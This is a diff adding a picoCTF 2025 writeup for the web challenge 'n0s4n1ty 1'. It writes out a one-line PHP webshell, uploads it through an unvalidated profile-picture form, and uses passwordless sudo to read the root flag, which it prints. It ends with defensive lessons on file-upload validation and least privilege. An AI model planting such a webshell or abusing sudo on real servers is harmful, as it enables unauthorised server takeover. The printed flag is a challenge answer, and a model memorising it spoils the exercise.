@@ -1,1 +1,257 @@
+# 🖼️ picoCTF 2025 — n0s4n1ty 1 Writeup
 
+## 📋 Overview
+
+| Property          | Details                                |
+| ----------------- | -------------------------------------- |
+| 🏷️ **Challenge** | `n0s4n1ty 1`                           |
+| 🌐 **Category**   | Web Exploitation                       |
+| 🧩 **Difficulty** | Easy                                   |
+| 🏆 **Points**     | 100                                    |
+| 🚩 **Flag**       | `picoCTF{wh47_c4n_u_d0_wPHP_56060bd8}` |
+
+---
+
+## 🧠 Concept
+
+The challenge contains a **profile picture upload feature** that does not properly validate uploaded files.
+
+Because the server accepts a PHP file, we can upload a **PHP webshell** — a small PHP script that executes commands on the server.
+
+The attack chain is:
+
+```text
+File Upload
+     ↓
+Upload PHP Webshell
+     ↓
+Remote Command Execution
+     ↓
+sudo -l
+     ↓
+Passwordless sudo
+     ↓
+Read /root/flag.txt
+     ↓
+🏆 Flag
+```
+
+---
+
+# 🚀 Steps
+
+## 1️⃣ Create a Webshell
+
+Create a file named:
+
+```text
+shell.php
+```
+
+with the following content:
+
+```php
+<?php system($_GET['cmd']); ?>
+```
+
+### 🔍 How It Works
+
+The script reads the `cmd` URL parameter:
+
+```text
+?cmd=COMMAND
+```
+
+and passes it to:
+
+```php
+system()
+```
+
+which executes the command on the server.
+
+For example:
+
+```text
+/uploads/shell.php?cmd=whoami
+```
+
+could execute:
+
+```bash
+whoami
+```
+
+on the server.
+
+---
+
+## 2️⃣ Upload the Webshell
+
+Navigate to the challenge's **profile picture upload** functionality.
+
+Upload:
+
+```text
+shell.php
+```
+
+The server accepts the PHP file because the upload functionality does not properly restrict executable file types.
+
+> ⚠️ In a real application, allowing users to upload executable server-side code can lead to **Remote Code Execution (RCE)**.
+
+---
+
+## 3️⃣ Get Command Execution
+
+After uploading the file, access the uploaded PHP file through the browser.
+
+The uploaded file is available under a path similar to:
+
+```text
+/uploads/shell.php
+```
+
+We can now pass commands through the `cmd` parameter.
+
+---
+
+## 4️⃣ Check Sudo Permissions
+
+Run:
+
+```text
+/uploads/shell.php?cmd=sudo -l
+```
+
+The server responds with something similar to:
+
+```text
+User www-data may run the following commands on challenge:
+    (ALL) NOPASSWD: ALL
+```
+
+### 🧠 What Does This Mean?
+
+The important part is:
+
+```text
+NOPASSWD: ALL
+```
+
+This means the `www-data` user can execute commands through `sudo` **without entering a password**.
+
+Additionally:
+
+```text
+(ALL)
+```
+
+indicates that the commands can be executed as any user.
+
+Therefore, we can execute commands as `root`.
+
+---
+
+# 💥 5️⃣ Read the Flag
+
+Use the webshell to execute:
+
+```text
+/uploads/shell.php?cmd=sudo cat /root/flag.txt
+```
+
+The server returns:
+
+```text
+picoCTF{wh47_c4n_u_d0_wPHP_56060bd8}
+```
+
+🏆 **Flag obtained!**
+
+---
+
+# 🏆 Flag
+
+```text
+picoCTF{wh47_c4n_u_d0_wPHP_56060bd8}
+```
+
+---
+
+# 📝 TL;DR
+
+| Step | Action                                                 |
+| ---: | ------------------------------------------------------ |
+|  1️⃣ | Create `shell.php` containing a PHP command runner     |
+|  2️⃣ | Upload the PHP file through the profile picture upload |
+|  3️⃣ | Access the uploaded file and execute commands          |
+|  4️⃣ | Run `sudo -l`                                          |
+|  5️⃣ | Discover `NOPASSWD: ALL`                               |
+|  6️⃣ | Run `sudo cat /root/flag.txt`                          |
+|  7️⃣ | 🏆 Retrieve the flag                                   |
+
+---
+
+# 🛡️ Security Lessons
+
+| ❌ Vulnerability                       | ✅ Secure Practice                                     |
+| ------------------------------------- | ----------------------------------------------------- |
+| Unrestricted file upload              | Allow only required file types                        |
+| Server-side executable files accepted | Store uploads outside the executable web root         |
+| Insufficient MIME/type validation     | Validate file extension, MIME type, and file contents |
+| Uploaded files directly accessible    | Generate safe filenames and restrict execution        |
+| Excessive `sudo` permissions          | Follow least-privilege principles                     |
+| `www-data` has unrestricted sudo      | Never grant unnecessary administrative privileges     |
+
+---
+
+## 🔐 Key Takeaways
+
+### 1. File Upload Validation Matters
+
+A profile-picture feature should **never blindly trust the uploaded filename or extension**.
+
+A malicious upload can turn a simple file-upload vulnerability into **Remote Code Execution**.
+
+### 2. Always Check Privileges After Obtaining a Shell
+
+```bash
+sudo -l
+```
+
+can reveal whether the current user has elevated privileges.
+
+### 3. Least Privilege Is Critical
+
+Giving a web-server account:
+
+```text
+NOPASSWD: ALL
+```
+
+effectively removes a major security boundary.
+
+---
+
+## 🎯 Final Attack Chain
+
+```text
+Profile Picture Upload
+        ↓
+Upload shell.php
+        ↓
+PHP executes `system($_GET['cmd'])`
+        ↓
+Command Execution
+        ↓
+sudo -l
+        ↓
+www-data → NOPASSWD: ALL
+        ↓
+sudo cat /root/flag.txt
+        ↓
+🏆 picoCTF{wh47_c4n_u_d0_wPHP_56060bd8}
+```
+
+> 💡 **Core lesson:** An insecure file-upload feature can lead to **Remote Code Execution**, and excessive `sudo` privileges can turn that foothold into complete system compromise.
